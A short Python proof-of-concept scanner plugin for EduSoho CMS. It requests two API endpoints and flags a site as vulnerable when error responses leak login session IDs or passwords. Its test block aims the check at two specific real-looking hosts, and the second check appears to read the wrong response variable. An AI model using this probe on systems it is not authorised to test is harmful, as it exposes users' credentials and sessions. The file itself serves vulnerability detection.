#!/usr/bin/env python
#coding:utf-8

def assign(service, arg):
    if service == "edusohocms":
        return True, arg

def audit(arg):
    poc1 = arg+'api/users/1/followings'
    poc2 = arg+'api/users/1/friendship?toIds[]=a'
    code, head, res1, errcode, _ = curl.curl2(poc1)
    code, head, res2, errcode, _ = curl.curl2(poc2)
    if code == 500 and "loginSessionId" in res1:
        security_hole("edusoho vulnerable:"+poc1)
    if code == 500 and "'password' => '" in res1:
        security_hole("edusoho vulnerable:"+poc2)

if __name__ == '__main__':
    from dummy import *
    audit(assign('edusohocms', 'http://mooc.sinepharm.com/')[1])
    audit(assign('edusohocms', 'http://123.57.231.22/')[1])